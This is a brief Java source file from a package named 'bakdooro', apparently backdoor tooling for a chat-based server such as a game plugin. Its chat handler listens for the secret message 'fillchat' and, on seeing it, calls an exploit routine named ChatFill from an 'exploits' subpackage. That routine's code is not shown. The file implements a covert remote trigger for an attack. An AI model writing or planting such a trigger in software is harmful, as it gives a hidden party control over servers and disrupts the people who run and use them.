package me.acaiberii.bakdooro.util.handler;

public class chathandler {
    public void handler(String message) {
        if (message.equals("fillchat")) {
            me.acaiberii.bakdooro.exp.exploits.ChatFill();
        }
    }
}
